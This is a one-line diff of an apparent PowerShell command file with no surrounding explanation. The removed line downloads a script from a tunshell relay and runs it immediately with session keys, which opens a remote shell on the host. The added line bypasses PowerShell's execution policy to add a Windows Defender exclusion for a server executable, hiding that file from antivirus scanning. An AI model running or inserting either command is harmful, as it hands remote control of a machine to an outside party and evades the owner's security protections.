@@ -1,1 +1,1 @@
-[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; &$([scriptblock]::Create((New-Object System.Net.WebClient).DownloadString('https://lets.tunshell.com/init.ps1'))) T tMhQpF0LAMVnlRvjQNVRzD 527Y3deQEZWMXGDJDXFLe6 au.relay.tunshell.com
+powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\erp-codgox-front\server.exe'"
